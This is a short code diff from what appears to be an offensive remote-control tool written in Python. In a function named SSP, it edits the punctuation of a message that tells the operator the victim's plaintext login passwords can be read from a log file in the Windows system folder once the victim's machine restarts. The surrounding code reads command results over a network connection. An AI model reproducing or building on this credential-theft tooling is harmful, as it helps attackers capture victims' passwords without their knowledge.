@@ -30,4 +30,4 @@ def SSP(conn, choice):
             result = conn.recv(1024).decode("gbk", errors="ignore")
             print(result)
             break
-    print('\033[1;32;32m' + "[+] 操作完成,待受害者的计算机重启后,可前往c:\\windows\\system32\\kiwissp.log查看受害者的明文登录密码!" + '\033[0m')
+    print('\033[1;32;32m' + "[+] 操作完成,待受害者的计算机重启后,可前往c:\\windows\\system32\\kiwissp.log查看受害者的明文登录密码." + '\033[0m')
